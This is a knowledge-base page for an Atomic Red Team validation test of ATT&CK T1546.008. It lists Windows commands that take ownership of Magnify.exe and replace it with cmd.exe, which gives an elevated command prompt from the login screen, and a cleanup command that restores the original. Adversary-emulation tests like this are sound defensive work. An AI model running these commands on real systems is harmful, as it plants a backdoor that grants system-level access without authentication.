---
atomic_guid: "5e4fa70d-c789-470e-85e1-6992b92bb321"
title: "Replace Magnify.exe (Magnifier binary) with cmd.exe"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.008"
attack_technique_name: "Event Triggered Execution: Accessibility Features"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml"
build_date: "2026-04-27 19:12:27"
executor: "command_prompt"
aliases:
  - "5e4fa70d-c789-470e-85e1-6992b92bb321"
  - "Replace Magnify.exe (Magnifier binary) with cmd.exe"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Replace Magnify.exe (Magnifier binary) with cmd.exe. This allows the user to launch an elevated command prompt by toggling on the Magnifier from the Accessibility menu on the login screen.

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution#^t1546008-accessibility-features|T1546.008: Accessibility Features]]

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\Magnify.exe /A
icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe
```

### Cleanup

```cmd
copy /Y C:\Windows\System32\Magnify_backup.exe C:\Windows\System32\Magnify.exe
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml)
